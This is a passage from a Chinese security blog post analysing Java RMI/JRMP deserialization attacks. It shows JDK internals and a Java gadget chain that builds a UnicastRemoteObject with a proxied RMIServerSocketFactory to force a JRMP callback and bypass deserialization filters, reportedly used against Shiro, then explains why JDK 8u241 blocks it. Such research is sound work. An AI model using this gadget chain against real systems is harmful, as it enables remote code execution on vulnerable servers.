class="params">(Remote var1, Method var2, Object[] var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">this</span>.ref.getChannel().newConnection();</span><br><span class="line">    <span class="type">StreamRemoteCall</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;opnum = &quot;</span> + var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var7 = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(var6, <span class="built_in">this</span>.ref.getObjID(), -<span class="number">1</span>, var4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var10</span> <span class="operator">=</span> var7.getOutputStream();</span><br><span class="line">            <span class="built_in">this</span>.marshalCustomCallData(var10);</span><br><span class="line">            var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="number">0</span>; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">                marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        var7.executeCall();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，这里同样可以发起一个连接，并且回到了StreamRemoteCall类的executeCall函数，即JRMPClient利用链中客户端反序列化接收到的数据的代码部分。同时由于过程中没有调用setObjectInputFilter的地方，所以也不会触发过滤函数。</p>
+<p>接下来就开始测试利用链了，像参考文章那样拼装一下就行了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"><span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line"><span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(ip, port);</span><br><span class="line"><span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">RemoteObjectInvocationHandler</span> <span class="variable">remoteObjectInvocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"><span class="type">RMIServerSocketFactory</span> <span class="variable">rmiServerSocketFactory</span> <span class="operator">=</span> (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">    RMIServerSocketFactory.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        RMIServerSocketFactory.class, Remote.class</span><br><span class="line">            &#125;, remoteObjectInvocationHandler);</span><br><span class="line"></span><br><span class="line"><span class="type">UnicastRemoteObject</span> <span class="variable">unicastRemoteObject</span> <span class="operator">=</span> (UnicastRemoteObject)Utils.createWithoutConstructor(<span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>);</span><br><span class="line">Utils.setField(unicastRemoteObject, <span class="string">&quot;ssf&quot;</span>, rmiServerSocketFactory);</span><br><span class="line">Utils.setField(unicastRemoteObject, <span class="string">&quot;ref&quot;</span>, ref);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> unicastRemoteObject;</span><br></pre></td></tr></table></figure>
+
+<p>最后顺手给shiro打一发，没问题通了。</p>
+<h4 id="攻击高版本注册中心、服务端、客户端-8u241"><a href="#攻击高版本注册中心、服务端、客户端-8u241" class="headerlink" title="攻击高版本注册中心、服务端、客户端(&gt;&#x3D;8u241)"></a>攻击高版本注册中心、服务端、客户端(&gt;&#x3D;8u241)</h4><p>对RemoteObjectInvocationHandler类的invokeRemoteMethod函数做了修改：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Verify that the method is declared on an interface that extends Remote</span></span><br><span class="line">Class&lt;?&gt; decl = method.getDeclaringClass();</span><br><span class="line"><span class="keyword">if</span> (!Remote.class.isAssignableFrom(decl)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemoteException</span>(<span class="string">&quot;Method is not Remote: &quot;</span> + decl + <span class="string">&quot;::&quot;</span> + method);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                  getMethodHash(method));</span><br></pre></td></tr></table></figure>
+
+<p>在调用UnicastRef.invoke之前对代理的函数做了验证，要求声明该函数的类必须继承Remote接口，然而RMIServerSocketFactory接口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIServerSocketFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a server socket on the specified port (port 0 indicates</span></span><br><span class="line"><span class="comment">     * an anonymous port).</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  port the port number</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the server socket on the specified port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException if an I/O error occurs during server socket</span></span><br><span class="line"><span class="comment">     * creation</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> 1.2</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> ServerSocket <span class="title function_">createServerSocket</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有继承，所以就通不过，也就无法打通了。</p>
+<p>那么该怎么攻击？我不知道啊！</p>
+<hr>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/DIgEe2HpwzHcvNM71cKxvg">https://mp.weixin.qq.com/s/DIgEe2HpwzHcvNM71cKxvg</a></p>
+<p><a href="https://www.anquanke.com/post/id/200860">https://www.anquanke.com/post/id/200860</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/JRMP/">JRMP</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2021/11/08/CVE-2020-17523-Shiro%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>CVE-2020-17523 Shiro认证绕过</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2021/10/20/shiro-550-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <span>shiro-550 1.2.4反序列化漏洞</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "反序列化中的JRMP末路(?)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
